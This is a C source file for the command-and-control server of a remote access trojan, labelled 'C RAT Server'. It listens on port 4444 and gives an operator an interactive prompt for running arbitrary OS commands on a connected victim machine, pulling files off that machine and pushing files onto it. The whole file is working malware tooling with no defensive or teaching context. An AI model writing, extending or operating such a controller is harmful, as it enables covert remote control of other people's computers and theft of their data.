#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <signal.h>

#define PORT 4444
#define BUFFER_SIZE 4096
#define MAX_COMMAND_SIZE 1024

typedef struct {
    char host[16];
    int port;
    int server_fd;
    int client_fd;
    struct sockaddr_in address;
    struct sockaddr_in client_addr;
} RAT_SERVER;

void print_banner() {
    printf("======================================================\n");
    printf("                    C RAT Server                     \n");
    printf("======================================================\n");
    printf("Commands:\n");
    printf("======================================================\n");
    printf("System:\n");
    printf("  help                                 show this help menu\n");
    printf("  <any_command>                        execute any OS command\n");
    printf("  exit                                 terminate session\n");
    printf("\nFiles:\n");
    printf("  download <remote_file> [local_dest]  download file from client\n");
    printf("  upload <local_file> [remote_dest]    upload file to client\n");
    printf("\nNotes:\n");
    printf("  All standard OS commands work (ls, pwd, cd, etc.)\n");
    printf("  Windows commands work too (dir, type, etc.)\n");
    printf("  The prompt shows the current OS and directory\n");
    printf("======================================================\n");
}

int setup_server(RAT_SERVER *server) {
    int opt = 1;
    
    // Create socket
    if ((server->server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Socket creation failed");
        return -1;
    }
    
    // Set socket options
    if (setsockopt(server->server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, 
                   &opt, sizeof(opt))) {
        perror("Setsockopt failed");
        return -1;
    }
    
    server->address.sin_family = AF_INET;
    server->address.sin_addr.s_addr = inet_addr(server->host);
    server->address.sin_port = htons(server->port);
    
    // Bind socket
    if (bind(server->server_fd, (struct sockaddr *)&server->address, 
             sizeof(server->address)) < 0) {
        perror("Bind failed");
        return -1;
    }
    
    // Listen for connections
    if (listen(server->server_fd, 5) < 0) {
        perror("Listen failed");
        return -1;
    }
    
    printf("[*] Server listening on %s:%d\n", server->host, server->port);
    return 0;
}

int accept_client(RAT_SERVER *server) {
    socklen_t client_len = sizeof(server->client_addr);
    char client_info[BUFFER_SIZE];
    
    printf("[*] Waiting for client connection...\n");
    
    if ((server->client_fd = accept(server->server_fd, 
                                   (struct sockaddr *)&server->client_addr, 
                                   &client_len)) < 0) {
        perror("Accept failed");
        return -1;
    }
    
    // Receive client information
    memset(client_info, 0, BUFFER_SIZE);
    recv(server->client_fd, client_info, BUFFER_SIZE - 1, 0);
    
    printf("[*] Connection established with %s\n", client_info);
    printf("[*] Client IP: %s\n", inet_ntoa(server->client_addr.sin_addr));
    return 0;
}

void send_command(RAT_SERVER *server, const char *command) {
    char command_with_newline[MAX_COMMAND_SIZE + 2];
    snprintf(command_with_newline, sizeof(command_with_newline), "%s\n", command);
    
    int bytes_sent = send(server->client_fd, command_with_newline, strlen(command_with_newline), 0);
    if (bytes_sent <= 0) {
        printf("Error: Failed to send command to client\n");
    }
}

void receive_response(RAT_SERVER *server) {
    char buffer[BUFFER_SIZE];
    char full_response[BUFFER_SIZE * 4] = {0};
    int bytes_received;
    int total_received = 0;
    int max_response_size = sizeof(full_response) - 1;
    
    // Set socket to non-blocking temporarily to handle timeouts
    struct timeval timeout;
    timeout.tv_sec = 1;  // 1 second timeout
    timeout.tv_usec = 0;
    setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    
    while (total_received < max_response_size) {
        memset(buffer, 0, BUFFER_SIZE);
        bytes_received = recv(server->client_fd, buffer, BUFFER_SIZE - 1, 0);
        
        if (bytes_received > 0) {
            buffer[bytes_received] = '\0';
            
            // Check if we have space to append
            if (total_received + bytes_received < max_response_size) {
                strcat(full_response, buffer);
                total_received += bytes_received;
            } else {
                // Truncate if response is too large
                strncat(full_response, buffer, max_response_size - total_received - 1);
                total_received = max_response_size - 1;
                strcat(full_response, "\n[Output truncated - too large]");
                break;
            }
            
            // If this is a small packet, it's likely the end
            if (bytes_received < BUFFER_SIZE - 1) {
                break;
            }
        } else if (bytes_received == 0) {
            printf("\nClient disconnected\n");
            break;
        } else {
            // Error or timeout - likely end of response
            break;
        }
    }
    
    // Reset socket to blocking mode
    timeout.tv_sec = 0;
    timeout.tv_usec = 0;
    setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    
    if (total_received > 0) {
        printf("%s", full_response);
        fflush(stdout);
    }
}

void handle_download(RAT_SERVER *server, const char *remote_filename, const char *local_destination) {
    FILE *file;
    char buffer[BUFFER_SIZE];
    int bytes_received;
    char filepath[512];
    
    // Determine local file path
    if (local_destination && strlen(local_destination) > 0) {
        // Check if destination is a directory
        struct stat st;
        if (stat(local_destination, &st) == 0 && S_ISDIR(st.st_mode)) {
            // Destination is a directory, append filename
            const char *base_filename = strrchr(remote_filename, '/');
            if (base_filename) {
                base_filename++; // Skip the '/'
            } else {
                base_filename = remote_filename;
            }
            snprintf(filepath, sizeof(filepath), "%s/%s", local_destination, base_filename);
        } else {
            // Destination is a full file path
            strcpy(filepath, local_destination);
        }
    } else {
        // No destination specified, use current directory with base filename
        const char *base_filename = strrchr(remote_filename, '/');
        if (base_filename) {
            base_filename++; // Skip the '/'
        } else {
            base_filename = remote_filename;
        }
        snprintf(filepath, sizeof(filepath), "./%s", base_filename);
    }
    
    file = fopen(filepath, "wb");
    if (!file) {
        printf("Error: Cannot create file %s\n", filepath);
        return;
    }
    
    printf("Downloading file: %s", remote_filename);
    if (local_destination && strlen(local_destination) > 0) {
        printf(" to %s", filepath);
    }
    printf("\n");
    
    while ((bytes_received = recv(server->client_fd, buffer, BUFFER_SIZE, 0)) > 0) {
        fwrite(buffer, 1, bytes_received, file);
        if (bytes_received < BUFFER_SIZE) {
            break; // End of file
        }
    }
    
    fclose(file);
    printf("File downloaded successfully as: %s\n", filepath);
}

void handle_upload(RAT_SERVER *server, const char *filename, const char *destination) {
    FILE *file;
    char buffer[BUFFER_SIZE];
    size_t bytes_read;
    char upload_info[512];
    
    file = fopen(filename, "rb");
    if (!file) {
        printf("Error: Cannot open file %s\n", filename);
        return;
    }
    
    printf("Uploading file: %s", filename);
    if (destination && strlen(destination) > 0) {
        printf(" to %s", destination);
    }
    printf("\n");
    
    // Send destination path and filename in format "destination|filename" followed by newline
    if (destination && strlen(destination) > 0) {
        snprintf(upload_info, sizeof(upload_info), "%s|%s\n", destination, filename);
    } else {
        // Extract just the filename for default location
        const char *base_filename = strrchr(filename, '/');
        if (base_filename) {
            base_filename++; // Skip the '/'
        } else {
            base_filename = filename;
        }
        snprintf(upload_info, sizeof(upload_info), "|%s\n", base_filename);
    }
    
    send(server->client_fd, upload_info, strlen(upload_info), 0);
    
    // Wait for acknowledgment from client before sending file content
    char ack[10];
    recv(server->client_fd, ack, sizeof(ack), 0);
    
    // Send file content
    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
        send(server->client_fd, buffer, bytes_read, 0);
    }
    
    fclose(file);
    printf("File uploaded successfully\n");
}

void execute_commands(RAT_SERVER *server) {
    char command[MAX_COMMAND_SIZE];
    char *args[10];
    char *token;
    int arg_count;
    
    print_banner();
    
    // Wait for initial prompt from client
    printf("Waiting for client prompt...\n");
    receive_response(server);
    printf("\n");
    
    while (1) {
        printf(">> ");
        fflush(stdout);
        
        if (!fgets(command, sizeof(command), stdin)) {
            break;
        }
        
        // Remove newline
        command[strcspn(command, "\n")] = 0;
        
        if (strlen(command) == 0) {
            continue;
        }
        
        // Parse command
        arg_count = 0;
        char command_copy[MAX_COMMAND_SIZE];
        strcpy(command_copy, command);
        token = strtok(command_copy, " ");
        while (token != NULL && arg_count < 9) {
            args[arg_count++] = token;
            token = strtok(NULL, " ");
        }
        args[arg_count] = NULL;
        
        if (strcmp(args[0], "help") == 0) {
            print_banner();
        }
        else if (strcmp(args[0], "download") == 0) {
            if (arg_count < 2) {
                printf("Usage: download <remote_file> [local_destination]\n");
                printf("  remote_file       - path to file on client to download\n");
                printf("  local_destination - optional local path where to save file\n");
                continue;
            }
            send_command(server, command);
            if (arg_count >= 3) {
                handle_download(server, args[1], args[2]);  // With destination
            } else {
                handle_download(server, args[1], NULL);     // Default location
            }
            // Wait for confirmation from client
            receive_response(server);
            printf("\n");
        }
        else if (strcmp(args[0], "upload") == 0) {
            if (arg_count < 2) {
                printf("Usage: upload <local_file> [remote_destination]\n");
                printf("  local_file         - path to file on server to upload\n");
                printf("  remote_destination - optional path on client where to save file\n");
                continue;
            }
            send_command(server, "upload");
            if (arg_count >= 3) {
                handle_upload(server, args[1], args[2]);  // With destination
            } else {
                handle_upload(server, args[1], NULL);     // Default location
            }
            // Wait for confirmation from client
            receive_response(server);
            printf("\n");
        }
        else if (strcmp(args[0], "exit") == 0) {
            send_command(server, "exit");
            printf("Terminating connection...\n");
            break;
        }
        else {
            // Send command to client and receive response with prompt
            send_command(server, command);
            receive_response(server);
            printf("\n");
        }
    }
}

void cleanup(RAT_SERVER *server) {
    if (server->client_fd > 0) {
        close(server->client_fd);
    }
    if (server->server_fd > 0) {
        close(server->server_fd);
    }
}

void signal_handler(int sig) {
    printf("\nReceived signal %d. Shutting down...\n", sig);
    exit(0);
}

int main() {
    RAT_SERVER server;
    
    // Setup signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Initialize server
    strcpy(server.host, "127.0.0.1");
    server.port = PORT;
    server.client_fd = -1;
    server.server_fd = -1;
    
    if (setup_server(&server) < 0) {
        cleanup(&server);
        return 1;
    }
    
    if (accept_client(&server) < 0) {
        cleanup(&server);
        return 1;
    }
    
    execute_commands(&server);
    
    cleanup(&server);
    return 0;
}